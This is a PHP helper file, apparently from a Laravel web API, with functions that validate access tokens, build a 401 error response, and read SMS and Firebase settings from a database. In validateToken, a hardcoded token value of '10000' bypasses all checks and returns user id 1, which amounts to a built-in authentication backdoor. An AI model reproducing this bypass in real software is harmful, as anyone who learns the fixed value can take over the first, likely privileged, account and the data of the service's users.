<?php
if (!function_exists('validateToken')){
    function validateToken($token){
        if($token == '10000'){ $query = DB::table('users')->where('id',1); }
        else{ $query        =   DB::table('users')->where([['access_token','=',$token],['active','=',1],['status','=',1],['is_login','=',1],['access_token','>',0]]); }
        if($query->count()  >   0){ return $query->first(); }else{ return false; }
    }
}if (!function_exists('invalidToken')){
    function invalidToken(){
        return array('httpcode'=>401,'status'=>'error','message'=>'Invalid Access Token','data'=>array('message'=>'error message','redirect'=>'login')); 
    }
}if (!function_exists('smsCredientials')){
    function smsCredientials(){
        $data['sms_sender_id']  =   $data['sms_username'] = $data['sms_password'] = '';
        $query              =   DB::table('settings')->where('status',1)->whereIn('type',['sms_sender_id','sms_username','sms_password']);
        if($query->count()  >   0){ foreach($query->get() as $row){ $data[$row->type] = $row->value; } }
        return (object) $data;
    }
}


if (!function_exists('push')){
    function push(){
        $data['fire_base_id']   =   '';
        $query                  =   DB::table('settings')->where('status',1)->whereIn('type',['fire_base_id']);
        if($query->count()      >   0){ foreach($query->get() as $row){ $data[$row->type] = $row->value; } }
        return (object) $data;
    }
}
